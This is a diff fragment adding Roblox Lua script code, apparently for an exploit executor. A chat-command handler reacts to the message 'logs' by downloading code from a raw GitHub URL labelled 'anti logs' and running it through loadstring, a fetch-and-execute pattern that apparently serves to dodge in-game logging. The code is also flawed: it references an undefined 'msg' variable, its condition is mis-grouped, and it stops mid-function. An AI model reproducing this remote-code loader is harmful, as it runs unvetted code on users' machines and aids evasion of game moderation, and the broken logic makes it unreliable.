@@ -1,0 +1,18 @@
+local function executeLoadstring(loadstringCode)
+    local success, result = pcall(function()
+        return loadstring(loadstringCode)()
+    end)
+
+    if not success then
+        warn("Error executing loadstring:", result)
+    end
+end
+
+local function handleCommand(message)
+    local lowercaseMessage = string.lower(message)
+    
+    
+    
+    if lowercaseMessage == "logs" or lowercaseMessage == ":logs" and msg.FromSpeaker ~= game.Players.LocalPlayer.Name then
+        local loadstringCode = "loadstring(game:HttpGet('https://raw.githubusercontent.com/DIZZYTHELEGEND/Zmod/main/anti%20logs'))()"
+        executeLoadstring(loadstringCode)
